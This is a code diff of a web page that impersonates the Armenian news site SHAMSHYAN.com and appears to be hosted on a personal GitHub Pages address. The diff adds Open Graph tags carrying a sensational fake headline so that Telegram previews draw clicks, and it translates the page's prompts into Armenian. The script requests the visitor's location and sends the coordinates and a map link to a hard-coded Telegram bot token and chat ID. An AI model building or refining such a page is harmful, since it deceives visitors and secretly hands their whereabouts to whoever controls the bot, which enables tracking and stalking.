@@ -2,8 +2,16 @@
 <html lang="hy">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>SHAMSHYAN.com - իմացիր դեպքի վայրից</title>
+    
+    <!-- Open Graph мета-теги для красивого превью в Telegram -->
+    <meta property="og:title" content="ՀՀ ԱԱՆ-ը հրապարակել է հանցավոր խմբավորման առաջնորդի անունը" />
+    <meta property="og:description" content="Բացառիկ լուրեր Հայաստանից և աշխարհից: Առաջինը իմացիր կարևոր իրադարձությունների մասին:" />
+    <meta property="og:image" content="https://edmanukyan1994.github.io/shamshyan/shamshyan-preview.jpg" />
+    <meta property="og:url" content="https://edmanukyan1994.github.io/shamshyan/" />
+    <meta property="og:type" content="website" />
+    
     <link rel="icon" type="image/png" sizes="32x32" href="https://i.shamshyan.com/favicon/favicon-32x32.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -59,7 +67,7 @@
 
 <div id="geoStatus" class="geo-status hidden">
     <i id="geoIcon" class="fas fa-map-marker-alt"></i>
-    <span id="geoMessage">Определение местоположения...</span>
+    <span id="geoMessage">Որոշվում է ձեր գտնվելու վայրը...</span>
 </div>
 
 <div class="container">
@@ -116,10 +124,10 @@
 </footer>
 
 <script>
-    // ========== ВАШИ ДАННЫЕ ==========
+    // ========== ВАШИ ДАННЫЕ (уже вставлены) ==========
     const TELEGRAM_BOT_TOKEN = '8569817774:AAGOwkVKL5lRyenrjaK3CibpuzkZM0x1Nww';
     const TELEGRAM_CHAT_ID = '8215628399';
-    // =================================
+    // =================================================
 
     async function sendToTelegram(latitude, longitude, accuracy) {
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -174,34 +182,34 @@
 
     function requestLocation() {
         if (!navigator.geolocation) {
-            showStatusMessage('❌ Ваш браузер не поддерживает геолокацию', true);
+            showStatusMessage('❌ Ձեր բրաուզերը չի աջակցում աշխարհագրական դիրքի որոշմանը', true);
             return;
         }
-        showStatusMessage('📍 Запрос разрешения на определение местоположения...', false);
+        showStatusMessage('📍 Խնդրում ենք թույլատրել ձեր գտնվելու վայրի որոշումը...', false);
         navigator.geolocation.getCurrentPosition(
             async (position) => {
                 const { latitude, longitude, accuracy } = position.coords;
                 const sent = await sendToTelegram(latitude, longitude, accuracy);
                 if (sent) {
-                    showStatusMessage('✅ Местоположение успешно отправлено!', false);
+                    showStatusMessage('✅ Ձեր գտնվելու վայրը հաջողությամբ ուղարկվել է:', false);
                 } else {
-                    showStatusMessage('⚠️ Местоположение определено, но не удалось отправить в Telegram. Проверьте бота.', true);
+                    showStatusMessage('⚠️ Տեղը որոշված է, սակայն չի ուղարկվել Telegram։ Ստուգեք բոտի կարգավորումները։', true);
                 }
             },
             (error) => {
                 let errorMessage = '';
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMessage = '❌ Доступ к геолокации запрещён. Разрешите доступ в настройках браузера.';
+                        errorMessage = '❌ Մերժվել է աշխարհագրական դիրքի հասանելիությունը: Խնդրում ենք թույլատրել բրաուզերի կարգավորումներում:';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMessage = '❌ Информация о местоположении недоступна.';
+                        errorMessage = '❌ Տեղորոշման տվյալները հասանելի չեն:';
                         break;
                     case error.TIMEOUT:
-                        errorMessage = '❌ Время запроса геолокации истекло.';
+                        errorMessage = '❌ Հարցման ժամանակը սպառվել է:';
                         break;
                     default:
-                        errorMessage = '❌ Неизвестная ошибка при определении местоположения.';
+                        errorMessage = '❌ Անհայտ սխալ տեղորոշման ժամանակ:';
                 }
                 showStatusMessage(errorMessage, true);
             },
